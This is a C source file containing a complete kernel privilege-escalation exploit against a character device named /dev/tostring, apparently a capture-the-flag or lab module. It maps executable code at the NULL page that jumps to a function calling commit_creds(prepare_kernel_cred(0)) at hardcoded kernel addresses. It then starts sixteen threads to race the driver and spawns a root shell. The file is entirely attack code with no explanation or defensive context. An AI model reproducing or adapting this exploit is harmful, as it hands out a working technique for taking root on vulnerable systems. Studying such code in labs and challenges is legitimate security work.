#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/wait.h>
#include<pthread.h>
#include<sys/syscall.h>

#define DEVICE_FILE "/dev/tostring"
#define SPRAY 0x10

int fd,finish=0,flag=0;
char cmd[0x10000];

typedef unsigned long __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0xffffffff8107ab70;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0xffffffff8107af00;

void privesc(){
        commit_creds(prepare_kernel_cred(0));
	flag=1;
}

void *threadfunc(void *arg){
	while(finish==0){
		read(fd,NULL,0);		
		if(flag==1){
			 printf("[+] Priv esc with tid=%ld\n",syscall(SYS_gettid));
			 char *args[]={"/bin/sh",NULL};
 		         execve("/bin/sh",args,NULL);
		}
	}
}

void exploit(){
	for(int i=0;i<10;i++){
		cmd[i]='*';
	}
	cmd[10]='N';
	cmd[11]='\x2d';
	for(int i=12;i<0x10000;i++){
		cmd[i]='\x38';
	}
	char *addr=(char *)mmap(NULL,0x3000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0);
	memset(addr,0,0x3000);
	addr[0]='\xff';
	addr[1]='\x25';
	*(unsigned long *)&addr[2]=0;
	*(unsigned long *)&addr[6]=(unsigned long)&privesc;
	puts("[+] Allocated NULL page with shellcode!");
	printf("[*] Parent pid=%d\n",getpid());
	printf("[*] Creating 0x10 malicious threads to trigger race condition\n");
	pthread_t t[SPRAY];
	for(int i=0;i<SPRAY;i++){
		pthread_create(&t[i],NULL,threadfunc,NULL);
	}
	write(fd,cmd,sizeof(cmd)-1);
	finish=1;
	for(int i=0;i<SPRAY;i++){
		pthread_join(t[i],NULL);
	}
}

int main(){
	fd=open(DEVICE_FILE,O_RDWR);
	exploit();
	close(fd);
	return 0;
}
